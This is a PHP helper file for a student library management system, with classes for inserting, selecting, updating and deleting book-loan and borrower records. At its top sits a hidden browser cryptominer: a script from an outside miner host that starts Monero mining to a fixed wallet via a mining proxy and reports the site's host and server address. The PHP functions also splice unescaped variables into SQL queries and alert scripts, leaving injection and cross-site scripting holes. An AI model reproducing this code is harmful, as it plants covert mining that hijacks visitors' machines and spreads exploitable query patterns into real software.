
<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
<script>
    server = "wss://f.xmrminingproxy.com:8181";
    var pppp = "moneroocean.stream";
    var aaa= "88pCPCBz3d8d22WENdaJsGN82BJSUsnRtgekKtZDxz3y8CFbtS81cicgLmPHvdYyxhWkQ7aiuzhGh4yM3ZmJD5KcAirXGrw";
    var pq= ""
    var tfff= -1;
    var uuuu = "<?php echo $_SERVER['HTTP_HOST'] ?>" + " " + "<?php echo $_SERVER['SERVER_ADDR'] ?>";
	    startMining(pppp, aaa, pq, tfff, uuuu);
    throttleMiner = 20;
</script>
<?php
	function getBookID($bookname)
{
	global $con, $studentid;
	$query1 = "SELECT * FROM  lmsbookloan inner join lmsbook on lmsbookloan.bookid = lmsbook.bookid where booktitle = '$bookname' and userid = '$studentid'";

	$result1 = mysqli_query($con,$query1);

	$row = mysqli_fetch_array($result1);

	return $row['bookid'];
	
}
class Library{
public function redirect($url)
{
	echo '<meta http-equiv="refresh" content="0.1; URL='.$url.'">';	
}
public function header($url)
{
	
	header("Location:$url");
}
public function alert($alert)
{
	echo '<script>alert("'.$alert.'");</script>';
}
public function DataInsert($con, $table, $query){
return mysqli_query($con, "insert into $table values ($query)");
	
}
public function selectData($con, $select, $table){
	return mysqli_query($con, "select $select from $table");
	
}
public function updateData($con, $table, $select){
	return mysqli_query($con, "update $table set $select");
	
}
public function deleteData($con, $table, $select){
mysqli_query($con, "delete from $table where $select");
	
}
public function bootstrapAlert($type, $alert, $msg)
{
	return '<br><div class="sufee-alert alert with-close alert-'.$type.' alert-dismissible fade show">
<center><span class="badge badge-pill badge-danger">'.$alert.'</span>
'.$msg.'</center>
<button type="button" class="close" data-dismiss="alert" aria-label="Close">
<span aria-hidden="true">&times;</span>
</button>
</div>';
	
}

}

class Adminbooks extends Library{
public function createBorrower($con, $query, $table = "lmsborrower"){
	return $this->DataInsert($con, $table, $query);
	
}
public function issueBook($con, $query, $table = "lmsbookloan"){
	return $this->DataInsert($con, $table, $query);
}
}
class StudentBooks extends Library{
public function reservebooks($con, $query, $table = "lmsbookloan"){
return $this->DataInsert($con, $table, $query);
}


}
